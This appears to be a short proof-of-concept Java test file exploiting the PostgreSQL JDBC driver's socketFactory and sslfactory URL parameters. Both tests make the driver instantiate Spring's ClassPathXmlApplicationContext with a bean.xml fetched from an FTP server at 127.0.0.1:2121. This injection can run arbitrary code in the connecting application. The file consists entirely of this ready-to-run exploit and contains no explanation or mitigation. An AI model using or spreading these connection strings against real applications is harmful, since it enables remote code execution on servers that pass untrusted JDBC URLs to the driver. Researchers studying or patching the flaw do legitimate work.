package com.trganda.poc;

import org.junit.jupiter.api.Test;

import java.sql.DriverManager;
import java.sql.SQLException;

public class Poc {
    @Test
    public void socketFactory() throws SQLException {
        String url = "jdbc:postgresql://localhost/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=ftp://127.0.0.1:2121/bean.xml";
        DriverManager.getConnection(url);
    }

    @Test
    public void sslFactory() throws SQLException {
        String url = "jdbc:postgresql://localhost/test?sslfactory=org.springframework.context.support.ClassPathXmlApplicationContext&sslfactoryarg=ftp://127.0.0.1:2121/bean.xml";
        DriverManager.getConnection(url);
    }
}
